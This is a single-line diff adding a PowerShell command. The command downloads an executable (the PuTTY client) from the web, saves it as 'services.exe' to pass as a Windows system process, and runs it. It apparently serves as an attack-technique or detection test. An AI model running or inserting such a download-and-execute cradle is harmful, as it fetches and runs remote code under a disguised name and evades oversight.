@@ -1,0 +1,1 @@
+$down = New-Object System.Net.WebClient; $url = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'; $file = 'services.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
